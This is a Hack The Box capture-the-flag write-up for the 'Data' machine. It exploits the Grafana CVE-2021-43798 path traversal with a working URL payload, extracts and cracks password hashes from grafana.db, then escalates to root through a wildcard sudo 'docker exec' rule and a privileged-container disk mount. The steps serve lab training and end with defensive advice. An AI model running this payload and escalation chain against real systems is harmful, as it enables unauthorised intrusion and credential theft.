# HTB Write-Up: Data

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Data)       |
| Difficulty | Easy                                                           |
| OS         | Linux                                                          |
| Author     | Samurai                                                        |
| Date       | June 14, 2026                                                  |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Initial Access — Grafana LFI (CVE-2021-43798)](#2-initial-access--grafana-lfi-cve-2021-43798)
3. [Credential Extraction & SSH Access](#3-credential-extraction--ssh-access)
4. [Privilege Escalation — Docker exec Abuse](#4-privilege-escalation--docker-exec-abuse)
5. [Summary](#5-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** for service and version fingerprinting:

```bash
nmap -A 10.129.234.47 -p 22,3000 -T5
```

**Open Ports:**

| Port | Service | Details                                      |
|------|---------|----------------------------------------------|
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7              |
| 3000 | HTTP    | Grafana (version 8.0.0)                      |

The host is running **Ubuntu 18.04.6 LTS** on AWS. Port **3000** exposes a **Grafana** instance — immediately interesting since Grafana 8.0.0 is known to be vulnerable to a critical LFI.

---

## 2. Initial Access — Grafana LFI (CVE-2021-43798)

### 2.1 — Vulnerability Confirmation

Grafana v8.0.0 is vulnerable to **CVE-2021-43798**, a path traversal / Local File Inclusion (LFI) vulnerability in the plugin endpoint. An unauthenticated attacker can read arbitrary files from the server by traversing outside the plugin directory using URL-encoded `../` sequences.

The vulnerability was confirmed using a public exploit script:

```bash
python3 exploit.py
# Select option 2 (checker) — confirmed vulnerable:
# Target http://10.129.234.47:3000 with version 8.0.0 is vulnerable
```

Example payload that works:

```
http://10.129.234.47:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 2.2 — Extracting the Grafana Database

The LFI was used to read Grafana's internal SQLite database, which stores user credentials:

```
/var/lib/grafana/grafana.db
```

Inside the database, the `user` table revealed two accounts:

```sql
sqlite> select * from user;
1|0|admin|admin@localhost|...|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|...
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|...
```

---

## 3. Credential Extraction & SSH Access

### 3.1 — Hash Cracking

The password hashes were extracted and formatted for cracking. Both use **PBKDF2-HMAC-SHA256** (hashcat mode `10900`):

```
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```

```bash
hashcat --show hashes
```

**Result:**

| User  | Password    |
|-------|-------------|
| boris | `beautiful1` |

### 3.2 — SSH Login as Boris

```bash
ssh boris@10.129.234.47
# Password: beautiful1
```

**User flag retrieved:**

```bash
boris@data:~$ cat user.txt
730fd32a6d5c9c02de7eb85a1bb19a1b
```

---

## 4. Privilege Escalation — Docker exec Abuse

### 4.1 — Sudo Rights Enumeration

```bash
boris@data:~$ sudo -l
```

**Output:**

```
User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Boris can run `docker exec` as root with no password. The wildcard `*` places no restriction on which container or command is targeted — a critical misconfiguration.

### 4.2 — Discovering the Running Container ID

Boris cannot run `docker ps` (no access to the Docker socket), but the container ID was visible in the process list:

```bash
ps -auxww | grep namespace
```

**Output:**

```
root  1536  ...  /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 ...
```

The full container ID was extracted and trimmed to Docker's standard 12-character short form:

```bash
echo e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 | head -c 12 | xargs
# e6ff5b1cbc85
```

### 4.3 — Root Shell Inside the Container

```bash
sudo /snap/bin/docker exec -it --user root --privileged e6ff5b1cbc85 /bin/bash
bash-5.1# whoami
root
```

### 4.4 — Mounting the Host Filesystem

The host's root partition was identified from `/proc/mounts`:

```
/dev/sda1 / ext4 rw,relatime 0 0
```

Since the container was running `--privileged`, it has direct access to host block devices. The host filesystem was mounted inside the container:

```bash
mkdir /tmp/data
mount /dev/sda1 /tmp/data/
cd /tmp/data/root
cat root.txt
```

**Root flag retrieved:**

```
4ccde6c973ca218920bf1ea043a47042
```

---

## 5. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap | Grafana 8.0.0 on port 3000 identified |
| Initial Access | CVE-2021-43798 LFI | `grafana.db` read; password hashes extracted |
| Credential Cracking | hashcat PBKDF2-HMAC-SHA256 | `boris:beautiful1` recovered |
| User Flag | SSH as boris | `user.txt` from `/home/boris` |
| Privesc Discovery | `sudo -l` | `NOPASSWD: docker exec *` found |
| Container ID | `ps -auxww` grep on containerd-shim | Full container hash found in process list |
| Root Shell | `sudo docker exec --privileged` | Root shell inside container |
| Host Escape | Mount `/dev/sda1` inside privileged container | Full host filesystem access |
| Root Flag | `cat /tmp/data/root/root.txt` | `root.txt` retrieved |

### Key Takeaways

- **Grafana CVE-2021-43798 is a critical unauthenticated LFI.** Any Grafana instance below version 8.0.5 is vulnerable. Reading `grafana.db` is the standard path to credential theft on this CVE — always patch or firewall monitoring services from public access.

- **Password reuse across services is dangerous.** The Grafana boris account used the same password as the SSH account. Even cracking a single hash can cascade into full system access if credentials are reused.

- **`NOPASSWD: docker exec *` is effectively root.** The wildcard means any container, any command. A privileged container with access to host block devices makes this a trivial path to full host compromise. Sudoers rules for Docker should never use wildcards.

- **Privileged containers are a container escape waiting to happen.** A `--privileged` container can access all host devices including raw disks. If you must use Docker sudo rules, restrict both the container name and the allowed commands explicitly, and avoid privileged mode.

- **Process listing leaks internal details.** The container ID was recoverable from `ps` output via the `containerd-shim` process, bypassing the Docker socket restriction entirely. Sensitive identifiers in process arguments are visible to all local users.
